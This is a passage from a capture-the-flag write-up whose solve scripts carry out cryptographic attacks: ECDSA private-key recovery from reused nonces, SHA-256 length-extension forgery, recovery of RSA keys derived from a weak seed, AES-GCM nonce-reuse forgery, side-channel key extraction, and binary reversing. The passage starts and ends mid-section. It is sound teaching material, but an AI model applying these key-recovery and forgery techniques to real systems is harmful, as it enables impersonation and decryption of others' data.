`GET /schema`, `GET /pubkey`, `GET /receipts`, `POST /authorize`.

#### Vulnerability: ECDSA nonce reuse
`GET /receipts` returned two signed receipts (`ta-9.7.14`, `ta-9.7.15`) that share the
**same `r`**:
```
r = 573e324e5b6779389c58d6b63bae51cf2db74ea2db447e0bb4f9463de11a6b52
```
Equal `r` ⇒ the same nonce `k` was used for both. That leaks the private key. The schema
even states the formula (`same_nonce_recovery`).

#### Solve
Hashing rule from `/schema`: `z = sha256(bytes.fromhex(message_hex)) as big-endian int mod n`.

1. `k = (z1 − z2)·(s1 − s2)⁻¹ mod n`
2. `d = (s1·k − z1)·r⁻¹ mod n`  → `d = 0xc6b157fb0733cb5b…e935ea78`
3. Verified `d·G` matches the published `/pubkey` exactly.
4. Signed the fixed `master_message_hex` with a fresh random nonce, then normalized to
   **low-s** (`s ≤ n/2`, required by `authorize_s_rule`).
5. `POST /authorize` with `{"message_hex","r","s"}` (fixed field order, minified JSON,
   all string values) → returned the flag.

#### Notes
- Receipts use raw-s (no low-s), but `/authorize` requires low-s — easy to miss.
- `hash_to_integer = sha256-int-be-mod-n`; the hash input is the raw message bytes, not hex text.

---

### 10. Countersign

**Flag:** `CSCTF{AMqSHJPHUrC8ddS6x1tQDpO6}`

#### Target
`http://w03.ctf.chronos-security.ro:33359` — grid dispatch console. Goal: get an
accepted `DISPATCH` command without the key.

Endpoints: `GET /api/spec`, `GET /api/sample`, `POST /api/command {message_hex, sig}`.

#### Vulnerability: SHA-256 length extension (secret-prefix MAC)
Spec: `tag = SHA-256(key_bytes || message_bytes)`, key is a secret *prefix*. This is the
textbook length-extension setup. Parser rule is the key enabler:
- split command bytes on `&`, split each token on first `=`,
- keep only tokens whose key matches `^[A-Za-z][A-Za-z0-9_]*$`,
- **last value wins**, command field = `cmd`.

Captured `STATUS`:
```
station=WESTBURN-07&cmd=STATUS&ts=1761688600&nonce=93ba7b16
sig = 16610d7b936774485feccb1135122aeaeba27db01d7dc3cda9c69f1d77113e48
```

#### Attack
1. Resume SHA-256 from the captured `sig` (its 8 words = internal state).
2. Append `&cmd=DISPATCH`. The SHA-256 glue padding (`0x80 … len`) sits between the
   original message and the append; the parser drops it as an invalid token, and
   "last value wins" makes `cmd=DISPATCH` override `cmd=STATUS`.
3. Key length (band 8–32) is unknown but only changes how many `0x00` glue bytes appear,
   so I generated all 25 candidate `message_hex` values and submitted each.
   - Because every candidate's total length rounds up to the same SHA-256 block boundary
     (128 bytes), the resulting tag is identical for all key lengths — only the padding
     bytes in `message_hex` differ.

**Key length = 28** was accepted → `DISPATCH_ACCEPTED` + authorization code.

#### Pure-Python implementation
No `hashpumpy`/`hash_extender` installed, so I implemented SHA-256 with a resumable state
(`_compress` over the captured digest words) and computed the glue padding manually:
`pad(L) = 0x80 + 0x00*((55-L) % 64) + be64(L*8)`.

Forged tag (all key lengths): `4ba3f0aee49f2dc1dddc925ea37e684daf0da4defcff3dcc20239b1bf5348e64`

---

### 11. Rollback Pair

**Flag:** `CSCTF{3b5789e468dadf358d375bb08dcd19b977c5715364a709326b43a35b0d5eaab1}`

#### Brief

An emergency logistics signing service came back up after a bad application-state
restore. We're given `signing-export.json`: eight signed dispatch records plus the
signing public key, on **secp256k1 / ECDSA / SHA-256**. The task: determine whether
the signing key was exposed and, if so, recover the signing scalar.

The title ("Rollback Pair") and the scenario line — *"dispatch signing resumed from a
faulty application nonce-state snapshot"* — are the tell: a state rollback caused the
signer to **reuse an ECDSA nonce `k`**.

#### Vulnerability: ECDSA nonce reuse

ECDSA signatures are `(r, s)` where `r = (k·G).x mod n`. The nonce `k` must be unique
and secret per signature. If the same `k` is used for two different messages, the `r`
value is **identical** across both signatures — and that leaks the private key.

Dumping the `r` halves (first 32 bytes) of all eight signatures:

```
R-6101 85de1343...   R-6105 9bb77e08...
R-6102 864eccc8...    R-6106 700117a3...
R-6103 821f3007...    R-6107 821f3007...   <-- identical r
R-6104 09048ef5...    R-6108 b3ecb84d...
```

**R-6103 and R-6107 share the same `r`** but have different `s` values → same nonce
reused on two different messages.

#### Key recovery

For two signatures `(r, s₁)` on hash `z₁` and `(r, s₂)` on hash `z₂` that share nonce `k`:

```
s₁ = k⁻¹ (z₁ + r·d)      s₂ = k⁻¹ (z₂ + r·d)
```

Subtracting eliminates `d` and solves for `k`, then back-substitute for `d`:

```
k = (z₁ − z₂) · (s₁ − s₂)⁻¹   (mod n)
d = (s₁·k − z₁) · r⁻¹          (mod n)
```

Each `z` is the SHA-256 of the exact signed bytes (the base64-decoded `message_b64`),
taken as a big-endian integer. The signatures are raw `s` (not low-s normalized), so to
be safe we also try the `s₁+s₂` form and the `±k` sign, then keep whichever candidate `d`
regenerates the published public key.

#### Solve script

```python
import hashlib, base64, json
n  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
p  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8

d = json.load(open('signing-export.json'))
z = lambda m: int.from_bytes(hashlib.sha256(base64.b64decode(m)).digest(), 'big')
a, b = d['records'][2], d['records'][6]            # R-6103, R-6107 (shared r)
r  = int(a['signature_rs_hex'][:64], 16)
s1, z1 = int(a['signature_rs_hex'][64:], 16), z(a['message_b64'])
s2, z2 = int(b['signature_rs_hex'][64:], 16), z(b['message_b64'])

def add(P, Q):
    if P is None: return Q
    if Q is None: return P
    if P[0] == Q[0] and (P[1] + Q[1]) % p == 0: return None
    l = (3*P[0]*P[0]) * pow(2*P[1], -1, p) % p if P == Q \
        else (Q[1]-P[1]) * pow(Q[0]-P[0], -1, p) % p
    x = (l*l - P[0] - Q[0]) % p
    return (x, (l*(P[0]-x) - P[1]) % p)

def mul(k, P):
    R = None
    while k:
        if k & 1: R = add(R, P)
        P = add(P, P); k >>= 1
    return R

for k in [((z1-z2)*pow(s1-s2, -1, n)) % n, ((z1-z2)*pow(s1+s2, -1, n)) % n]:
    for kk in (k, (-k) % n):
        priv = ((s1*kk - z1) * pow(r, -1, n)) % n
        px, py = mul(priv, (Gx, Gy))
        if format(px, '064x') == d['public_key']['x'] and \
           format(py, '064x') == d['public_key']['y']:
            print("CSCTF{%064x}" % priv)
```

The recovered scalar regenerates the exported public key exactly (both `x` and `y`
match), confirming it is the genuine signing key.

#### Flag

```
CSCTF{3b5789e468dadf358d375bb08dcd19b977c5715364a709326b43a35b0d5eaab1}
```

#### Takeaway

Never roll an ECDSA signer back to a previous nonce/state snapshot. A single reused
nonce across two signatures fully discloses the private key. Use RFC 6979 deterministic
nonces (or a hedged scheme) so `k` is bound to the message and key rather than to mutable
application state.

---

### 12. Harvest

**Category:** OSINT / Crypto (Medium) · **Points:** 270

**Flag:** `CSCTF{PP-7_SNOP}`

#### Question

Where did the 417th squadron's sling-load cargo actually go on 14 August 2026, and what was it?

#### Key facts from the handout

- **Signals instruction (04):** crew reports use a Vigenère cipher (Latin alphabet, transliterated Russian, `X` marks a word boundary). The key is the crew's **callsign for the day** from the flight schedule. Sites are named by PP number only, and naming a settlement is prohibited. Cargo is named by code word only.
- **Flight schedule (03):**
  - Bort 22 `ZHATVA`: external sling load, 09:00–10:55, "LZ per separate order".
  - Bort 25 `BEREG`: sling load to PP-5.
  - Bort 34 `VORON`: U/S (gearbox replacement, not before 18.08).
  - No flights after 15:00 because of a thunderstorm warning.
- **Logistics (05):** bort 22 carries `SNOP` x4 (portable EW jamming set), sling, "PP per order". PP-2 (Staroselye) has been **CLOSED since 02.08 (mines)**.

#### Decryption

Try each callsign as the Vigenère key:

```python
def d(c,k): return ''.join(chr((ord(x)-ord(k[i%len(k)]))%26+65) for i,x in enumerate(c))
```

**#1 (DTG 141020), key `ZHATVA`:**
```
DOKLAD ZHATVA GRUZ SNOP CHETYRE MESTA DOSTAVLEN PP SEM VREMYA DESYAT DVADTSAT BORT DVADTSAT DVA KONEC
= Report ZHATVA: cargo SNOP, 4 pieces, delivered PP-7, time 10:20, bort 22. End.
```
It is consistent with everything else: bort 22's 09:00–10:55 slot, SNOP x4 from the loading plan, 21 groups, and no settlement named.

**#2 (DTG 141630), key `VORON`:**
```
DOKLAD VORON GRUZ KORZINA SHEST MEST DOSTAVLEN PP DVA STAROSELYE VREMYA SHESTNADTSAT TRIDTSAT BORT TRIDTSAT CHETYRE KONEC
= Report VORON: cargo KORZINA x6 delivered PP-2 STAROSELYE, 16:30, bort 34.
```
This one is a **plant** that backs up the Telegram story. Five things expose it:
- Bort 34 is unserviceable (gearbox) until 18.08.
- 16:30 falls inside the no-fly thunderstorm window after 15:00.
- PP-2 has been closed (mined) since 02.08.
- It names a settlement, which section 4.3 prohibits.
- KORZINA x6 does not appear in the loading plan.

The photo, a Mi-24 carrying a sling load, does not fit either: the sling-load tasks were flown by Mi-8s.

#### Answer

The cargo went to **PP-7** (Mirnoe, harvested field west of the dairy farm), and it was **SNOP**, 4 portable EW jamming sets, carried by Mi-8 bort 22 "ZHATVA" at 10:20.

`CSCTF{PP-7_SNOP}`

---

### 13. Operation Dawn: The Courier's Keys

**Flag:** `CSCTF{01_advance_on_the_mill_a7c3f1}`

#### Attachment
`fleet-provisioning.pcap` — captures an Ash Army field-radio fleet provisioning over UDP/7000.

#### Recon
- Packet 2 (broadcast) is the **provisioning profile**:
  ```
  seed = (power_up_epoch_seconds << 16) | serial
  generator = MT19937 seeded with that value
  draw two 512-bit primes in turn: candidate with top and bottom bits set,
    keep the first that is prime; these are p then q
  N = p*q, e = 65537
  ```
- Each radio (`10.23.7.x`) sends `REG serial=<s> e=65537 N=<hex>`; server ACKs. 9 moduli captured (all 1024-bit).
- Packet 84: `ORDER serial=6631 C=<hex>` — the RSA ciphertext to recover.

#### Weakness
The whole private key comes from `seed = (epoch << 16) | serial`. "Simultaneous cold start" ⇒
every unit shares **one** `power_up_epoch_seconds`; only the 16-bit serial varies. The
keyspace is just the unknown epoch (seconds).

- Pairwise GCD of the 9 moduli found **no** shared factor (independent MT streams).
- So brute-force the shared epoch. Python's `random` module is MT19937, matching the profile.

#### Solve
For each candidate epoch, seed `random.Random((epoch<<16)|6631)`, generate the **first**
512-bit prime (`getrandbits(512) | (1<<511) | 1`, test `isprime`), and check whether it
divides the known `N_6631`. ~0.04 s per epoch.

Capture time ≈ `1699989961` (Nov 2023); scanned outward. **Hit at epoch 1699994067.**

Then regenerate `p` then `q` from the same stream (modulus matched `N_6631` exactly),
`d = e^{-1} mod (p-1)(q-1)`, `m = C^d mod N`:

```python
import random
from sympy import isprime
rng = random.Random(); rng.seed((1699994067 << 16) | 6631)
def gp():
    while True:
        c = rng.getrandbits(512) | (1<<511) | 1
        if isprime(c): return c
p, q = gp(), gp(); N = p*q
d = pow(65537, -1, (p-1)*(q-1))
m = pow(C, d, N)
# b'CSCTF{01_advance_on_the_mill_a7c3f1}'
```

#### Flag
`CSCTF{01_advance_on_the_mill_a7c3f1}`

---

### 14. Watchword

**Flag:** CSCTF{watchword_2005b4d082c8f06019960d36c5131e783d4bc532}

#### Vuln: AES-GCM nonce reuse -> "forbidden attack" (recover GHASH key H + tag mask S)
Three AES-128-GCM dispatches share one nonce. Each is a single ciphertext block, so with
empty AAD:  T_i = C_i·H^2 ⊕ L_i·H ⊕ S  (GF(2^128)), where
- H = E_K(0^128) (GHASH subkey), S = E_K(J0) (per-nonce tag mask),
- L_i = GCM length block (0^64 ‖ bitlen(C_i)).

Pairwise: (C0⊕C1)·H^2 ⊕ (L0⊕L1)·H = (T0⊕T1).  The map H -> a·H^2 ⊕ b·H is **GF(2)-linear**
(Frobenius square + constant-mult are linear), so solve a 128x128 linear system over GF(2)
for H (two roots: particular solution ⊕ null-space). The correct H makes
S = T_i ⊕ (C_i·H^2 ⊕ L_i·H) equal for all three dispatches.

Recovered: H=0x730426f0d054fc7539d26145168be28a, S=0x66b18782c578d8b27ec249a6298dfeb2.

#### Unseal
Master order sealed with AES-128-CTR, IV=0, key = S (E_K(J0)). CTR-decrypt the blob -> flag text.

Run: `python3 solve.py`

#### Fix
Never reuse a GCM nonce under one key — a single reuse leaks H (universal forgery) and the
per-nonce mask. Use random 96-bit nonces with a counter/limit, or a nonce-misuse-resistant
mode (AES-GCM-SIV).

---

### 15. Emanation

**Recovered order:** `CSCTF{relay_order_55a10bd8f06393bcc1ae8065}`
**Recovered AES-128 key:** `52cc11fc4a2ecfc066e3349f4af9fdea`

#### Brief

A "QARVETH-73 field encryptor" runs a **protected AES-128 first round** under known
plaintexts. The handout `emanation.zip` contains:

- `traces.npy` — `8000 × 56` float32 synthetic power traces (Hamming-weight + noise model)
- `plaintexts.npy` — `8000 × 16` uint8 known plaintexts (one per trace)
- `sealed_order.hex` — the order, AES-128-**CTR** encrypted under the device key, zero IV/counter

Countermeasures preserved (per the README): **a per-row Boolean byte mask** and **a
random delay**. Goal: recover the key via side-channel analysis, then decrypt the order.

#### Why the naive attacks fail

1. **First-order CPA** on `HW(Sbox(p⊕k))` is flat (corr ≈ 0.046, no winner) — the mask
   randomizes the S-box output, killing first-order leakage.
2. **Second-order CPA** (centered product of all sample pairs) on the *raw* traces gives a
   weak, ambiguous ~0.06 and a garbage key. The real problem is the **random delay**:
   every trace is time-shifted, so no fixed sample index lines up across traces. The
   leakage smears out, inflating per-sample variance (std ≈ 6) with misalignment noise and
   capping the achievable correlation far below the intrinsic ceiling (~0.37 for clean HW).

#### The key realization — realign on the delay marker

Printing individual traces shows a single large spike (~24–26, everything else < 10) that
sits at a **different index in every trace** (sample 0, 12, 1, 6, …). Its position is the
**random delay**: the whole sensitive computation is shifted so it begins at that spike.
The delay is uniform over 0–16 samples.

Realigning each trace so the spike sits at index 0 (`np.roll(trace, -argmax)`) instantly
cleans everything up:

- Aligned **mean** becomes a crisp pattern: the spike at 0, then **mean ≈ 4.0 at odd
  positions 3,5,7,…,35** (= `E[HW(byte)] = 4`) — 17 Hamming-weight leak points.
- Aligned **std** at those points drops from ~6 to ~1.7 (≈ clean HW, std 1.46) — the
  misalignment noise is gone.

Those 17 leak points are the **shared mask** `HW(m)` (position 3) and the **16 masked
S-box outputs** `HW(Sbox(pᵢ⊕kᵢ)⊕m)` (positions 5,7,…,35).

#### Second-order CPA on aligned traces

Standard masked-AES recombination: for each key guess `k`, correlate
`HW(Sbox(pᵢ⊕k))` against the **centered product** of the mask sample and each value
sample. After alignment this is decisive — every byte wins with corr ≈ **0.24** vs a
runner-up ≈ 0.06:

```
byte 0  k=0x52  pair=(3,5)     byte 8  k=0x66  pair=(3,21)
byte 1  k=0xcc  pair=(3,7)     byte 9  k=0xe3  pair=(3,23)
byte 2  k=0x11  pair=(3,9)     byte10  k=0x34  pair=(3,25)
byte 3  k=0xfc  pair=(3,11)    byte11  k=0x9f  pair=(3,27)
byte 4  k=0x4a  pair=(3,13)    byte12  k=0x4a  pair=(3,29)
byte 5  k=0x2e  pair=(3,15)    byte13  k=0xf9  pair=(3,31)
byte 6  k=0xcf  pair=(3,17)    byte14  k=0xfd  pair=(3,33)
byte 7  k=0xc0  pair=(3,19)    byte15  k=0xea  pair=(3,35)
```

Position **3 is the shared mask** for all bytes; byte *i* leaks at position `5 + 2i`.

**Key = `52cc11fc4a2ecfc066e3349f4af9fdea`**

#### Solve script

```python
import numpy as np
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

t = np.load('traces.npy').astype(float); p = np.load('plaintexts.npy').astype(int)
SBOX = np.frombuffer(bytes.fromhex(   # standard AES S-box
 "637c777bf26b6fc5...54bb16"), dtype=np.uint8).astype(int)   # (full table in repo)
hw = np.array([bin(x).count("1") for x in range(256)], float)
N, S = t.shape

# 1) realign on the random-delay spike
d = t.argmax(1)
A = np.stack([np.roll(t[r], -d[r]) for r in range(N)])
tc = A - A.mean(0)

# 2) HW leak points = samples whose aligned mean ~ 4
sig = [i for i in range(1, 40) if abs(A[:, i].mean() - 4) < 1]   # 3,5,...,35
pairs = [(i, j) for a, i in enumerate(sig) for j in sig[a+1:]]
P2 = np.stack([tc[:, i]*tc[:, j] for i, j in pairs], 1)
P2c = P2 - P2.mean(0); P2n = np.sqrt((P2c*P2c).sum(0))

# 3) second-order CPA per key byte
key = []
for b in range(16):
    H = np.stack([hw[SBOX[p[:, b] ^ k]] for k in range(256)], 1); Hc = H - H.mean(0)
    C = (Hc.T @ P2c) / (np.sqrt((Hc*Hc).sum(0))[:, None]*P2n[None, :] + 1e-12)
    key.append(np.abs(C).max(1).argmax())
key = bytes(key)

# 4) AES-128-CTR decrypt (zero counter) -> keystream = AES-ECB of 0,1,2,...
ct = bytes.fromhex(open('sealed_order.hex').read().strip())
c = Cipher(algorithms.AES(key), modes.ECB()).encryptor()
ks = b''.join(c.update(i.to_bytes(16, 'big')) for i in range((len(ct)+15)//16))
print(bytes(a ^ b for a, b in zip(ct, ks)))
# -> b'CSCTF{relay_order_55a10bd8f06393bcc1ae8065}'
```

#### Flag

```
CSCTF{relay_order_55a10bd8f06393bcc1ae8065}
```

#### Takeaways

- **Defeat the random delay first.** With a per-trace delay, fixed-index CPA is hopeless;
  any reliable alignment marker (here the big spike at the start of the window) lets you
  realign and recover clean leakage. Look at raw traces before trusting correlations —
  misaligned data produces *plausible but wrong* keys (an early, unaligned run confidently
  pointed at a completely different key for byte 0).
- **Then beat the mask** with standard second-order recombination (centered product of the
  mask sample × each value sample), correlating against `HW(Sbox(p⊕k))`.
- A masked **and** hiding (random-delay) first round is not enough when the mask leaks at a
  single shared point and the delay has a visible marker.

---

---

## Reverse Engineering

### 16. Command Authority

*Reverse Engineering · Easy · 120 pts*

**Flag:** `CSCTF{f96f4417c75121c3d27b039d}`

#### Challenge

Responders recovered an offline checkpoint **verifier**. The evidence zip holds a personnel image and a password-protected archive; the goal is the restricted clearance value the verifier accepts. The chain: image → password → archive → reverse the verifier for the clearance value.

#### 1. Image → archive password

The zip extracts `id_photo.jpg` and `pass_bundle.zip`. The JPEG has bytes appended after its `FFD9` end-of-image marker — a classic place to stash data.

**Screenshot 1:** the password is appended to the image

```bash
cd ~/cmdauth
unzip -o command-authority-evidence.zip
tail -c 40 id_photo.jpg; echo       # ARCHIVE-KEY:aPS6xxqP2CfNU0
strings id_photo.jpg | grep -i ARCHIVE-KEY
```

Archive key: `aPS6xxqP2CfNU0`.

#### 2. Archive → verifier binary

**Screenshot 2:** unlock the protected archive

```bash
cd ~/cmdauth
unzip -P 'aPS6xxqP2CfNU0' -o pass_bundle.zip   # -> pass.token + field_verifier
file field_verifier
# ELF 64-bit PIE, stripped
base64 -d <<< "$(cat pass.token)" ; echo        # peek at the sample token
```

`pass.token` base64-decodes to `role=civilian&id=civ-88213&route=STANDARD-CORRIDOR-7` followed by a 32-byte HMAC — a sample *standard*-route token (the decoy). The real target is the `field_verifier` ELF.

#### 3. Reverse the verifier

**Screenshot 3:** strings reveal the logic and an obfuscated blob

```bash
cd ~/cmdauth
strings field_verifier | grep -iE 'role|route|RESTRICTED|clearance|STANDARD|command-authority'
objdump -s -j .rodata field_verifier | sed -n '/2120/,/2140/p'
```

The verifier parses `role`/`id`/`route`, HMAC-SHA256-checks the token, and branches on the route: `route: RESTRICTED` → `clearance confirmed`, otherwise `standard clearance only`. On the restricted path it emits the clearance value — which is stored **obfuscated** in `.rodata` at `0x2120` (31 bytes, before the SHA-256 constants):

```
0212 0215 073a 2778 7727 7575 7076 2276
7470 7370 2272 2573 7623 7172 7825 3c
```

#### 4. Deobfuscate → clearance value

The blob is a single-byte XOR. The key falls out instantly from the known `CSCTF{` prefix: `0x02⊕'C'=0x41`, `0x12⊕'S'=0x41`, `0x15⊕'T'=0x41`, … → **XOR 0x41**.

**Screenshot 4:** one-line decode

```bash
python3 -c "t=bytes.fromhex('0212021507 3a277877 27757570 76227674 70737022 72257376 23717278 253c'.replace(' ','')); print(bytes(b^0x41 for b in t).decode())"
# CSCTF{f96f4417c75121c3d27b039d}
```

The value is embedded in the binary, so there's no need to forge a signed `RESTRICTED` token — deobfuscating the string gives the flag directly.

#### Takeaways

- **Check past the EOF marker.** Data after a JPEG's `FFD9` (or a PNG's `IEND`) is a standard stash spot — `tail`/`strings` surface it immediately.
- **Read `.rodata`, not just code.** The accept value never appears in plain `strings` because it's XOR-obfuscated; dumping the section and spotting the non-ASCII blob next to the real strings is the tell.
- **Known-plaintext breaks trivial XOR.** The `CSCTF{` prefix reveals the single-byte key (`0x41`) in one step — no need to brute-force or run the binary.
- **Don't over-engineer.** The HMAC/token machinery is a red herring for the flag itself; the clearance value is a constant the verifier would have printed, recoverable statically.

**Flag:** `CSCTF{f96f4417c75121c3d27b039d}`

---

### 17. Fence Shift

*Reverse Engineering · Medium · 270 pts*

**Flag:** `CSCTF{active_2bbb27_provisioned_3aa227}`

#### Challenge

A patrol aircraft left its assigned corridor, and the capture shows the geofence parameters being *changed* mid-flight. We get three files: `fcu` (a stripped x86-64 ELF — the flight controller's fence predicate), `mission.pcapng` (a MAVLink session between aircraft `192.0.2.11`, a route manager, and ground station `192.0.2.40`), and `ops_notes.txt`. The job: recover the controller's exact accept/reject decision, then score all 22 ground-origin `MAV_CMD_DO_REPOSITION` requests twice — once under the **confirmed active** fence state in force immediately before each request, and once under the **initial provisioned** state — and encode each 22-bit acceptance mask as six lowercase hex digits for `CSCTF{active_AAAAAA_provisioned_PPPPPP}`.

The trap is the word *confirmed*: a ground `PARAM_SET` doesn't change the fence until the aircraft echoes back a matching `PARAM_VALUE`. Get that timing wrong and the two masks blur together.

#### 1. Recover the fence predicate from fcu (static)

`ops_notes.txt` says the controller takes `fcu fence <block> <lat_e7> <lon_e7> <alt_cm>` and reads a 28-byte little-endian block — field order, widths, format tag, conversions and comparison all have to come out of the binary.

**Screenshot 1:** disassemble and find the decision logic
```bash
cd ~/fenceshift
objdump -d -M intel --no-show-raw-insn fcu > fcu.asm
strings -a fcu | grep -iE 'ACCEPT|REJECT|fence|usage|invalid'
# the fence handler reads 28 bytes via fread, then the math + ACCEPT/REJECT branch:
sed -n '/cmp .*0x5346/,/ACCEPT/p' fcu.asm
```

![Capture d'écran 2026-11-08 004752.png](images/c7d393f5-636c-4240-a84c-6d98cc740570.png)

Reading the IL branch by branch, the 28-byte block is:

```
off 0  int32  A   centre lat_e7  (the aircraft's initial GPS fix)
off 4  int32  B   centre lon_e7
off 8  int32  C   GF_RADIUS_CM
off 12 int32  D   GF_ALTMAX_CM
off 16 int32  E   GF_OFS_E_CM    (east centre offset, cm)
off 20 int32  F   GF_OFS_N_CM    (north centre offset, cm)
off 24 uint16 G   GF_MARGIN_PC   (radius margin %)
off 26 uint16 tag must equal 0x5346  ("FS")
```

The controller then computes, in pure integer arithmetic:

```
Xc = A + round(F * 8983 / 10000)          # shifted centre lat
Yc = B + round(E * 8983 / 10000)          # shifted centre lon
R  = round( ((100+G) * C / 100) * 8983 / 10000 )   # margin-inflated radius
dist2 = (lat_e7 - Xc)^2 + (lon_e7 - Yc)^2
ACCEPT  iff  tag==0x5346  AND  G<=100  AND  dist2 <= R*R  AND  alt_cm <= D
```

The magic constant `8983/10000` is `1e7 / 11,132,000` — the conversion from centimetres to WGS84 e7 units (≈111.32 km per degree). The rounding uses the x86 `idiv` symmetric (round-half-away-from-zero) form with a `+5000` bias and a `-10000` correction for negatives; replicate it exactly or boundary points flip.

#### 2. Parse the MAVLink capture

**Screenshot 2:** pull params, the initial fix, and the 22 repositions
```bash
cd ~/fenceshift
cat > solve.py << 'EOF'
#!/usr/bin/env python3
# Fence Shift - self-contained solver: pcapng -> MAVLink -> fcu predicate -> masks
import struct
data=open('mission.pcapng','rb').read()

# ---- 1. walk pcapng, collect Enhanced Packet Blocks ----
pkts=[]; off=0
while off+12<=len(data):
    btype,blen=struct.unpack_from('<II',data,off)
    if blen<12: break
    if btype==0x00000006:                       # Enhanced Packet Block
        caplen=struct.unpack_from('<I',data,off+20)[0]
        pkts.append(data[off+28:off+28+caplen])
    off+=blen

# ---- 2. eth/ipv4/udp -> (src, dst, payload) ----
def udp(pd):
    if len(pd)<14 or pd[12:14]!=b'\x08\x00': return None
    ihl=(pd[14]&0xf)*4
    if pd[14+9]!=17: return None                # not UDP
    src='.'.join(map(str,pd[26:30])); dst='.'.join(map(str,pd[30:34]))
    uo=14+ihl; ulen=struct.unpack_from('>H',pd,uo+4)[0]
    return src,dst,pd[uo+8:uo+8+ulen-8]

# ---- 3. MAVLink v1/v2 frame iterator ----
def mav(buf):
    i=0
    while i<len(buf):
        b=buf[i]
        if b==0xFE and i+8<=len(buf):           # v1
            ln=buf[i+1]; yield(buf[i+3],buf[i+5],buf[i+6:i+6+ln]); i+=8+ln; continue
        if b==0xFD and i+12<=len(buf):          # v2
            ln=buf[i+1]; inc=buf[i+2]; mid=buf[i+7]|(buf[i+8]<<8)|(buf[i+9]<<16)
            yield(buf[i+5],mid,buf[i+10:i+10+ln]); i+=12+ln+(13 if inc&1 else 0); continue
        i+=1
pad=lambda p,n: p+b'\x00'*(n-len(p)) if len(p)<n else p[:n]

AIR='192.0.2.11'; GCS='192.0.2.40'
ev=[]
for pd in pkts:
    r=udp(pd)
    if not r: continue
    src,dst,pl=r
    for sysid,mid,p in mav(pl):
        if   mid==33:                            # GLOBAL_POSITION_INT
            p=pad(p,28); _,lat,lon,*_=struct.unpack_from('<IiiiI',p); ev.append(('GPI',src,lat,lon))
        elif mid==22:                            # PARAM_VALUE
            p=pad(p,25); val,cnt,idx=struct.unpack_from('<fHH',p); pid=p[8:24].split(b'\x00')[0].decode()
            ev.append(('PVAL',src,pid,val,idx))
        elif mid==23:                            # PARAM_SET
            p=pad(p,23); val=struct.unpack_from('<f',p)[0]; pid=p[6:22].split(b'\x00')[0].decode()
            ev.append(('PSET',src,pid,val))
        elif mid==75:                            # COMMAND_INT
            p=pad(p,35); _,_,_,_,x,y,z=struct.unpack_from('<ffffiif',p); cmd=struct.unpack_from('<H',p,28)[0]
            if cmd==192 and src==GCS: ev.append(('REQ',x,y,int(round(z*100))))

# ---- 4. recovered fcu predicate (exact integer arithmetic) ----
def tdiv(a,b): return a//b if a>=0 else -((-a)//b)          # x86 idiv: trunc toward zero
def conv(x):   return tdiv(x*8983+(-10000 if x<0 else 0)+5000,10000)   # cm -> e7 units
def R_e7(C,G): return (((100+G)*C)//100*8983+5000)//10000
def accept(f,A,B,lat,lon,alt_cm):
    if f['GF_MARGIN_PC']>100: return False
    Xc=A+conv(f['GF_OFS_N_CM']); Yc=B+conv(f['GF_OFS_E_CM']); R=R_e7(f['GF_RADIUS_CM'],f['GF_MARGIN_PC'])
    d2=(lat-Xc)**2+(lon-Yc)**2
    return d2<=R*R and alt_cm<=f['GF_ALTMAX_CM']

# ---- 5. provisioned state = first PARAM_VALUE of each index; centre = first fix ----
prov={}; seen=set()
for e in ev:
    if e[0]=='PVAL' and e[4] not in seen: seen.add(e[4]); prov[e[2]]=int(round(e[3]))
A,B = next((e[2],e[3]) for e in ev if e[0]=='GPI')

# ---- 6. replay in capture order with confirmation gating ----
active=dict(prov); pending=[]; burst=5; am=pm=0; ri=0
for e in ev:
    if e[0]=='PSET': pending.append((e[2],int(round(e[3]))))
    elif e[0]=='PVAL':
        if burst>0: burst-=1
        else:
            nv=(e[2],int(round(e[3])))
            if nv in pending: pending.remove(nv)
            active[e[2]]=nv[1]
    elif e[0]=='REQ':
        x,y,ac=e[1],e[2],e[3]
        if accept(active,A,B,x,y,ac): am|=1<<ri
        if accept(prov,  A,B,x,y,ac): pm|=1<<ri
        ri+=1

print(f"provisioned: {prov}  centre=({A},{B})  requests={ri}")
print(f"active      mask = {am:022b} = {am:06x}")
print(f"provisioned mask = {pm:022b} = {pm:06x}")
print(f"CSCTF{{active_{am:06x}_provisioned_{pm:06x}}}")
EOF
```

What the capture yields:

- **Provisioned fence** (the initial aircraft `PARAM_VALUE` burst, indexes 0–4): `GF_RADIUS_CM=4000`, `GF_ALTMAX_CM=12000`, `GF_OFS_E_CM=0`, `GF_OFS_N_CM=0`, `GF_MARGIN_PC=0`.
- **Provisioned centre** = first `GLOBAL_POSITION_INT` fix = `lat 457913250, lon 241502100`.
- Five ground `PARAM_SET`s, each later confirmed by a matching aircraft `PARAM_VALUE`: `MARGIN 25` → `MARGIN 0` → `RADIUS 3000` → `OFS_E 1500` → `OFS_N -1000`.
- 22 ground-origin `COMMAND_INT` (`MAV_CMD_DO_REPOSITION`, cmd 192) with `x=lat_e7, y=lon_e7, z=alt_m`; `alt_cm = z*100`.

#### 3. Replay with confirmation gating

The active state starts as the provisioned fence. Walking the capture in order, a `PARAM_SET` is held *pending* until an aircraft `PARAM_VALUE` echoes the same id+value — only then does the active fence change. For each reposition we snapshot the active fence *immediately before* it, and separately evaluate the frozen provisioned fence.

**Screenshot 3:** the two masks
![2026-11-08_005704.png](images/2026-11-08_005704.png)

![2026-11-08_005719.png](images/2026-11-08_005719.png)

![2026-11-08_005727.png](images/2026-11-08_005727.png)

![2026-11-08_010145.png](images/2026-11-08_010145.png)

```bash
cd ~/fenceshift
python3 -I solve.py
# provisioned: {'GF_RADIUS_CM': 4000, 'GF_ALTMAX_CM': 12000, 'GF_OFS_E_CM': 0, 'GF_OFS_N_CM': 0, 'GF_MARGIN_PC': 0}  centre=(457913250,241502100)  requests=22
# active      mask = 1010111011101100100111 = 2bbb27
# provisioned mask = 1110101010001000100111 = 3aa227
# CSCTF{active_2bbb27_provisioned_3aa227}
```

#### 4. The tell — req7 vs req8

